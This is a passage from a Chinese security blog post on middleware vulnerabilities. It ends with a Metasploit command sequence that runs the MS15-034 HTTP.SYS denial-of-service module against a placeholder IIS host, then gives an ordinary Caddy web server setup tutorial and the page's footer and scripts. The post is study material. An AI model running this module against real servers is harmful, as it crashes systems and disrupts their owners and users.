+<p>漏洞利用条件：安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本</p>
+<h4 id="漏洞利用-12"><a class="markdownIt-Anchor" href="#漏洞利用-12"></a> 漏洞利用</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/dos/http/ms15_034_ulonglongadd</span><br><span class="line">set rhosts xx.xx.xx.xx</span><br><span class="line">set rport xx</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="../images/e31dc0fd122742921c7c0325cb871888.png" alt="img" /></p>
+<p><img src="../images/db28febcb43ee0dbea016e9c22ebbc80.png" alt="img" /></p>
+<h2 id="caddy"><a class="markdownIt-Anchor" href="#caddy"></a> Caddy</h2>
+<p><a target="_blank" rel="noopener" href="https://jruing.github.io/wiki/Linux/caddy/caddy%E6%89%8B%E5%86%8C.html#_1">caddy手册 - Wiki</a></p>
+<p><strong>Caddy</strong> 是一个现代化、高性能的 Web 服务器，支持自动 HTTPS、HTTP/2、IPv6、反向代理等功能。它由 Go 编写，易于部署和管理，特别适合用于现代 Web 应用和服务。以下是 Caddy 的一些主要特点：</p>
+<ol>
+<li><strong>自动 HTTPS：</strong> Caddy 可以自动为您的网站提供 HTTPS 支持，而不需要复杂的配置。它使用 Let’s Encrypt 来自动获取和管理 SSL/TLS 证书。</li>
+<li><strong>简单配置：</strong> Caddy 的配置文件语法简洁明了，易于理解和编写。您可以使用简单的配置来定义您的网站和应用程序的行为。</li>
+<li><strong>静态文件服务器：</strong> Caddy 可以作为静态文件服务器，用于提供网站或文件的简单和快速访问。</li>
+<li><strong>反向代理：</strong> Caddy 可以作为反向代理，用于将请求代理到其他服务器或应用程序，以实现负载平衡、路由和应用程序加速等功能。</li>
+<li><strong>HTTP/2 支持：</strong> Caddy 支持 HTTP/2 协议，可以提供更快和更高效的网站加载速度。</li>
+<li><strong>插件系统：</strong> Caddy 提供了丰富的插件系统，使您可以轻松扩展其功能，例如添加额外的中间件、日志记录、认证等功能。</li>
+</ol>
+<h3 id="安装及部署-4"><a class="markdownIt-Anchor" href="#安装及部署-4"></a> 安装及部署</h3>
+<p><strong>Linux：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https</span><br><span class="line">curl -1sLf &#x27;https://dl.cloudsmith.io/public/caddy/stable/gpg.key&#x27; | sudo apt-key add -</span><br><span class="line">curl -1sLf &#x27;https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt&#x27; | sudo tee /etc/apt/sources.list.d/caddy-stable.list</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install caddy</span><br></pre></td></tr></table></figure>
+<p><strong>docker启动：</strong></p>
+<p>docker-compose:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.5&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">caddy-server:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">caddy:2.7.6</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CADDY_ADMIN=0.0.0.0:2019</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./Caddyfile:/etc/caddy/Caddyfile</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./data:/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./logs:/var/log/caddy</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;443:443&quot;</span></span><br><span class="line">    <span class="comment">#      - &quot;443:443/udp&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;127.0.0.1:2019:2019&quot;</span></span><br><span class="line">    <span class="comment"># 默认CMD </span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;caddy&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;--config&quot;</span>, <span class="string">&quot;/etc/caddy/Caddyfile&quot;</span>, <span class="string">&quot;--adapter&quot;</span>, <span class="string">&quot;caddyfile&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">default:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&quot;web3&quot;</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<h3 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法"></a> 基本语法</h3>
+<p>Caddy 使用 <code>Caddyfile</code> 进行配置，默认位置：<code>/etc/caddy/Caddyfile</code></p>
+<p>最简单的 Caddyfile：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:80 &#123;</span><br><span class="line">    reverse_proxy 127.0.0.1:9000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这表示 Caddy 监听本机 80 端口，把请求转发到本机 9000 端口</p>
+<p>如果你把站点地址写成域名：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example.com &#123;</span><br><span class="line">    reverse_proxy 127.0.0.1:9000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么 Caddy 会在能识别域名且 DNS/端口条件满足时自动为入口侧启用 HTTPS。官方文档明确写了：对已知主机名，Caddy 默认自动提供 HTTPS</p>
+<p>多站点配置：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">example.com &#123;</span><br><span class="line">    root * /var/www/html</span><br><span class="line">    file_server</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">api.example.com &#123;</span><br><span class="line">    reverse_proxy localhost:8080</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>网站根目录在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+<p>当用户访问<code>http://example.com/index.html</code>时实际上访问的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/index.html</span><br></pre></td></tr></table></figure>
+<p><code>file_server</code></p>
+<p>意思是：</p>
+<p>开启 <strong>静态文件服务器</strong></p>
+<p>允许访问：</p>
+<ul>
+<li>html</li>
+<li>css</li>
+<li>js</li>
+<li>图片</li>
+<li>下载文件</li>
+</ul>
+<p>比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">example.com/test.html</span><br><span class="line">example.com/a.jpg</span><br><span class="line">example.com/file.zip</span><br></pre></td></tr></table></figure>
+<p>都会直接从 <code>/var/www/html</code> 读取</p>
+<p>常见功能模块与配置：<br />
+<img src="../images/image-20260325210806601.png" alt="image-20260325210806601" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="tag">中间件</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/1715139851115171513985117.jpg" data-sizes="auto" alt="[Vulnhub靶机通关]Empire_LupinOne" class="lazyload">
+          
+        
+        <a href="/2026/03/27/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DEmpire_LupinOne/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [Vulnhub靶机通关]Empire_LupinOne
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1715139851115171513985117.jpg" data-sizes="auto" alt="[Vulnhub靶机通关]EmpireBreakout" class="lazyload">
+        
+      
+      <a href="/2026/03/24/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DEmpireBreakout/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [Vulnhub靶机通关]EmpireBreakout
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E5%AE%B9%E5%99%A8%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text"> 服务器、中间件、容器基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache"><span class="toc-number">2.</span> <span class="toc-text"> Apache</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8F%8A%E9%83%A8%E7%BD%B2"><span class="toc-number">2.1.</span> <span class="toc-text"> 安装及部署</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85apache%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 安装Apache服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 使用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-httpd-%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9Ecve-2017-15715"><span class="toc-number">2.2.</span> <span class="toc-text"> Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9Eapache_parsing_vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text"> Apache多后缀解析漏洞（apache_parsing_vulnerability）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-2"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-http-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2021-41773"><span class="toc-number">2.4.</span> <span class="toc-text"> Apache HTTP 路径穿越漏洞（CVE-2021-41773）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-3"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="toc-number">2.4.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-http-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2021-42013"><span class="toc-number">2.5.</span> <span class="toc-text"> Apache HTTP 路径穿越漏洞（CVE-2021-42013）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">2.5.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="toc-number">2.5.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-ssi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.6.</span> <span class="toc-text"> Apache SSI 远程命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-4"><span class="toc-number">2.6.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-5"><span class="toc-number">2.6.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nginx"><span class="toc-number">3.</span> <span class="toc-text"> Nginx</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8F%8A%E9%83%A8%E7%BD%B2-2"><span class="toc-number">3.1.</span> <span class="toc-text"> 安装及部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text"> CRLF注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-2"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-6"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text"> 目录穿越漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-3"><span class="toc-number">3.3.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-7"><span class="toc-number">3.3.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add_header%E8%A2%AB%E8%A6%86%E7%9B%96"><span class="toc-number">3.4.</span> <span class="toc-text"> add_header被覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-4"><span class="toc-number">3.4.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-8"><span class="toc-number">3.4.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text"> 解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-5"><span class="toc-number">3.5.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-9"><span class="toc-number">3.5.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iis"><span class="toc-number">4.</span> <span class="toc-text"> IIS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8F%8A%E9%83%A8%E7%BD%B2-3"><span class="toc-number">4.1.</span> <span class="toc-text"> 安装及部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iis60-put%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.</span> <span class="toc-text"> IIS6.0 PUT漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-6"><span class="toc-number">4.2.1.</span> <span class="toc-text"> 漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-10"><span class="toc-number">4.2.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E7%8C%9C%E8%A7%A3"><span class="toc-number">4.3.</span> <span class="toc-text"> 短文件名猜解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-5"><span class="toc-number">4.3.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-11"><span class="toc-number">4.3.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iis6-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.4.</span> <span class="toc-text"> IIS6 解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-6"><span class="toc-number">4.4.1.</span> <span class="toc-text"> 漏洞简介</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iis7-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.5.</span> <span class="toc-text"> IIS7 解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-7"><span class="toc-number">4.5.1.</span> <span class="toc-text"> 漏洞简介</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#httpsyscve-2015-1635%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BD%9C%E8%93%9D%E5%B1%8F%E7%A0%B4%E5%9D%8F%E8%B7%9F%E6%9D%83%E9%99%90%E4%B8%8D%E6%8C%82%E9%92%A9"><span class="toc-number">4.6.</span> <span class="toc-text"> HTTP.SYS（CVE-2015-1635）主要用作蓝屏破坏，跟权限不挂钩</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-8"><span class="toc-number">4.6.1.</span> <span class="toc-text"> 漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-12"><span class="toc-number">4.6.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#caddy"><span class="toc-number">5.</span> <span class="toc-text"> Caddy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8F%8A%E9%83%A8%E7%BD%B2-4"><span class="toc-number">5.1.</span> <span class="toc-text"> 安装及部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text"> 基本语法</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "中间件及漏洞",
+          url: "http://example.com/2026/03/25/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E/",
+          excerpt: "",
+          description: "",
+          stripContent: "所谓的中间件漏洞就是并非是由于代码程序上设计存在缺陷而导致的漏洞，而是属于应用部署中环境配置不当或使用不当而导致的漏洞，同时这方面的漏洞也是最容易被管理员忽略的一部分。 中间件通常包括六大类：Web 服务器、Servlet 容器 / 应用服务器、缓存、消息队列 / 事件流、API 网关 / 反向代理、搜索 / 分析中间件  服务器、中间件、容器基本概念 web服务器：web服务器用于提供http服务，即向客户端返回信息，其可以处理HTTP协议，响应针对静态页面或图片的请求，控制页面跳转，或者把动",
+          date: "Wed Mar 25 2026 19:33:12 GMT+0800",
+          updated: "Wed Mar 25 2026 21:28:35 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
